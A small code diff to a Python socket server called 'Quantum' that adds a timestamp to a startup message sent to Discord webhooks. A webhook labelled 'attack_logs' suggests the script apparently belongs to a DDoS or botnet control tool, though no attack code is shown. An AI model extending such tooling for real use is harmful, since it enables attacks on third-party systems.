@@ -9,7 +9,7 @@
 
 
 ## Modules
-import socket, sys, os, requests, time, threading, requests, random, select
+import socket, sys, os, requests, time, threading, requests, random, select, datetime
 from dhooks import Webhook #<-- install this module on yo machine
 
 ## Files
@@ -25,6 +25,7 @@ attack_l = Webhook(str(webhooks["attack_logs"]))
 
 host = "127.0.0.1" # nvm lol
 port = 5555 #random.randint(0, 65500)
+now = datetime.datetime.now() # current time
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Try To Reuse Port Bypass TIME_WAIT Sometimes
@@ -32,7 +33,7 @@ sock.bind((host, port))
 sock.listen()
 
 print(f"Quantum Started | Port: {port}")
-screen_l.send(f"Quantum Started\nPort: {port}\nHost: {host}") # sends msg to the discord
+screen_l.send(f"Quantum Started\nPort: {port}\nHost: {host}\nTime: {now}") # sends msg to the discord
 
 def handle_connection(client, addr):
         Current.CurrentInfo["IP"] = addr[0]
